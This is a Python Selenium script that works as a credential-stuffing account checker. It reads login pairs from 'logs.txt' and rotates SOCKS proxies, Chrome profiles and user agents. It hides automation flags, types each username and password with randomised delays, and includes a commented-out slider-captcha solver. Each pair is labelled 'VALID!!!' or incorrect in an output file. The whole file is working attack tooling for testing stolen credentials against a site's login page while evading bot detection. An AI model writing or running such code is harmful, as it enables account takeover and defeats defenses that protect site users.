from seleniumwire import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.wait import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.action_chains import ActionChains
from selenium.common.exceptions import NoSuchElementException
from selenium.common.exceptions import TimeoutException
from time import sleep
import random

service = Service(executable_path= "path/to/chromedriver")
options = Options()

# Directory attributes
user_data_dir = "path/to/chrome"
options.add_argument("--allow-profiles-outside-user-dir")
options.add_argument(f"--user-data-dir={user_data_dir}")

def input (s, element):
     element.clear
     acts = ActionChains(chrome).move_to_element(element).click().perform()
     for i in s:
          element.send_keys(i, Keys.ARROW_RIGHT)
          sleep(random.uniform(0.4, 0.6))

with open('logs.txt', 'r') as file:
    lines = file.readlines()

with open('socks.txt', 'r') as file:
    s = file.readlines()

pairs = [line.strip().split(" ") for line in lines]

for x in range(0, len(pairs)):

     # Seleniumwire configuration to use a proxy
     seleniumwire_options = {
     'proxy': {
          'http': s[x % 3],
          'https': s[x % 3],
          'verify_ssl': False,
          'no_proxy': 'localhost,127.0.0.1',
          'proxy_type': 'manual'
          },
     }

     p = str(x % 3)
     options.add_argument("--profile-directory=Profile " + p)

     # Adding argument to disable the AutomationControlled flag 
     options.add_argument("--disable-blink-features=AutomationControlled")
     # Exclude the collection of enable-automation switches 
     options.add_experimental_option("excludeSwitches", ["enable-automation"])
     # Turn-off userAutomationExtension 
     options.add_experimental_option("useAutomationExtension", False)

     chrome = webdriver.Chrome(service=service, options=options, seleniumwire_options=seleniumwire_options)
     chrome.fullscreen_window()
     chrome.maximize_window()

     # Setting user agent iteratively
     useragentarray = ["Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
                    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0.0.0"]

     chrome.execute_cdp_cmd("Network.setUserAgentOverride", {"userAgent": useragentarray[x % 3]})

     chrome.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")

     # chrome.get('http://httpbin.org/ip')
     # print(chrome.find_element(By.TAG_NAME, "body").text)

     chrome.get("https://www.yorsite.com/")

     while (len(chrome.find_elements(By.XPATH, "//span[contains(text(), 'Sign in')]")) < 1):
          chrome.refresh()
          sleep(random.uniform(5, 6))
          
     element_to_hover_over = chrome.find_element(By.XPATH, "//span[contains(text(), 'Sign in')]")

     ActionChains(chrome).move_to_element(element_to_hover_over).double_click().perform()
     sleep(random.uniform(2, 3))
     
     try:
          ActionChains(chrome).click(element_to_hover_over).perform()
          sleep(random.uniform(3, 4))
     except: pass
          
     sleep(random.uniform(3, 4))

     username_input = chrome.find_element(By.NAME, "login")
     password_input = chrome.find_element(By.NAME, "password")

     input (pairs[x][0], username_input)
     input (pairs[x][1], password_input)
     # waiting for captcha downloading
     sleep (10)
     submit_button = chrome.find_element(By.ID, "submit")
     ActionChains(chrome).move_to_element(submit_button).click().perform()
     
     # SOLVER FOR SLIDER CAPTCHA     
     # iframe = chrome.find_element(By.ID, "captcha_frame_id")
     # chrome.switch_to.frame(iframe)
     # slider_container = chrome.find_element(By.XPATH, "//span[contains(text(), 'Slide')]")
     # slider = chrome.find_element(By.ID, "slider_id")
     # ActionChains(chrome).move_to_element(slider).click_and_hold().move_by_offset(slider_container.size['width'], 0).pause(0.3).release().perform()
     # sleep(3)
     # try:
     #      ActionChains(chrome).move_to_element(submit_button).click().perform()
     # except:
     #      pass
     
     sleep(random.uniform(10, 11))

     if (len(chrome.find_elements(By.XPATH, "//span[contains(text(), 'Your account name or password is incorrect.')]")) >= 1):
          lines[x] = lines[x].rstrip('\n') + ':Incorrect log pass\n'
     elif (chrome.current_url == 'https://www.yorsite.com/'):
          lines[x] = lines[x].rstrip('\n') + ':VALID!!!\n'
     else:
          lines[x] = lines[x].rstrip('\n') + ':Need check again\n'

     sleep (10)
     chrome.delete_all_cookies()
     chrome.quit()

with open('output.txt', 'w') as file:
    file.writelines (lines)